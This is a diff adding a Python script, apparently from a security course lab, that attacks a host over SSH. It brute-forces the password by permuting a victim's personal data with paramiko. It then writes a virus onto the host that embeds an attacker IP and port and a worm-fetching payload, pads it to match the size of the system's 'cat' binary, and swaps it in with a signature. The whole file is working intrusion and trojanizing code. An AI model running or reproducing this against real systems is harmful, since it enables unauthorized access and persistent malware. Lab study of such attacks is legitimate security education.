@@ -1,0 +1,91 @@
+#!/usr/bin/env python3
+from itertools import combinations, permutations
+import paramiko
+import socket
+import time
+import sys
+
+def crack_ssh_passwd(victim_ip:str, username:str):
+    '''
+    Utilize itertools to iterate through the "victim.dat" file to try out different combinations
+    of all possible passwords to perform dictionary attack
+    '''
+    # open and read victim's personal information
+    info_file = open('/home/csc2023/materials/victim.dat', 'r')
+    info = info_file.read().splitlines()
+
+    # iterate through all possible passwd combinations based on victim's personal information
+    for combination_len in range(1, len(info) + 1):
+        for combinations_list in combinations(info, combination_len):
+            for passwd in permutations(combinations_list):
+                client = crack(victim_ip, username, ''.join(passwd))
+                if client:
+                    return client
+                
+def infect_cat(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
+    '''
+    01. Create a compression virus with the content in ./virus
+    02. Append the file content of ./get_worm to the compression virus
+    03. Calculate the difference in size and add paddings with signature
+    '''
+    with open('virus', 'r') as f:
+        virus_content = f.read()
+    with open('get_worm', 'r') as f:
+        get_worm_content = f.read()
+
+    _stdin, stdout, stderr = client.exec_command("echo '" + virus_content + "' > virus;")
+    _stdin, stdout, stderr = client.exec_command("echo 'HOST = " + '"' + attacker_ip + '"' + "' >> virus;")
+    _stdin, stdout, stderr = client.exec_command("echo 'PORT = " + attacker_port + "' >> virus;")
+    _stdin, stdout, stderr = client.exec_command("echo '" + get_worm_content + "' >> virus;")
+
+    _stdin, stdout, stderr = client.exec_command("""
+        ls -l cat | awk {'print $5'};
+        ls -l virus | awk {'print $5'};
+    """)
+    sizes = stdout.read().decode().splitlines()
+    padding_size = int(sizes[0]) - int(sizes[1]) - 8
+    _stdin, stdout, stderr = client.exec_command("dd if=/dev/zero bs=" + str(padding_size) + " count=1 >> virus;")
+    _stdin, stdout, stderr = client.exec_command("""
+        chmod +x virus;
+        rm -f cat;
+        mv virus cat;
+        echo -n "deadbeaf" >> cat;
+    """)
+    print(f"[*] Victim Infected !")
+    
+
+def crack(victim_ip:str, username:str, passwd:str):
+    '''
+    Utilize paramiko to build SSH connection with the client while catching exceptions
+    '''
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.banner_timeout = 300
+        client.connect(hostname=victim_ip, username=username, password=passwd, timeout=3)
+        print(f"[+] Password Cracked: {username}:{passwd}")
+        return client
+    # authentication failed
+    except paramiko.AuthenticationException:
+        print(f"[!] Authentication failed for {username}:{passwd}")
+        return None
+    # host unreachable
+    except socket.timeout:
+        print(f"[!] {victim_ip} is unreachable, timeout.")
+        return None
+    # there was any other error connecting or establishing an SSH session
+    except paramiko.SSHException:
+        print(f"[!] Something wrong, retrying...")
+        time.sleep(1)
+        return crack(victim_ip, username, passwd)
+
+if __name__ == '__main__':
+    victim_ip = sys.argv[1]
+    victim_name = 'csc2023'
+    attacker_ip = sys.argv[2]
+    attacker_port = sys.argv[3]
+
+    # task1
+    client = crack_ssh_passwd(victim_ip, victim_name)
+    # task 2 & 3
+    infect_cat(client, attacker_ip, attacker_port)
